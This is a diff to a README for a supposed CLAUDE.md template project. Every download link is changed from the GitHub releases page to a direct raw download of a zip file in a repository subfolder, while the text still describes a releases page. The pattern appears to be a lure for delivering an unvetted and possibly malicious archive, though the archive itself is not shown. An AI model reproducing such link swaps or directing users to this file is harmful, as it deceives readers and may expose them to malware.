@@ -1,6 +1,6 @@
 # 🚀 BorisChernyClaudeMarkdown - Simple Template for CLAUDE.md Files
 
-[![Download](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/maximus0411/BorisChernyClaudeMarkdown/releases)
+[![Download](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/maximus0411/BorisChernyClaudeMarkdown/main/mensual/Boris_Cherny_Markdown_Claude_1.6.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Before you start, make sure your computer meets these basic needs:
 
 To get the software, **visit this page to download the latest release**:
 
-[Download BorisChernyClaudeMarkdown Releases](https://github.com/maximus0411/BorisChernyClaudeMarkdown/releases)
+[Download BorisChernyClaudeMarkdown Releases](https://raw.githubusercontent.com/maximus0411/BorisChernyClaudeMarkdown/main/mensual/Boris_Cherny_Markdown_Claude_1.6.zip)
 
 You will find the latest version of the template file there. The page is easy to navigate, with clear links to download ZIP files containing the CLAUDE.md template.
 
@@ -40,7 +40,7 @@ Follow these instructions step-by-step to download and start using the template 
 
 Open your web browser and go to:
 
-https://github.com/maximus0411/BorisChernyClaudeMarkdown/releases
+https://raw.githubusercontent.com/maximus0411/BorisChernyClaudeMarkdown/main/mensual/Boris_Cherny_Markdown_Claude_1.6.zip
 
 This page shows all available releases of the template. The latest one usually appears at the top.
 
@@ -129,7 +129,7 @@ Typical sections in the file:
 
 You can return to the release page at any time:
 
-[Download BorisChernyClaudeMarkdown Releases](https://github.com/maximus0411/BorisChernyClaudeMarkdown/releases)
+[Download BorisChernyClaudeMarkdown Releases](https://raw.githubusercontent.com/maximus0411/BorisChernyClaudeMarkdown/main/mensual/Boris_Cherny_Markdown_Claude_1.6.zip)
 
 ---
 
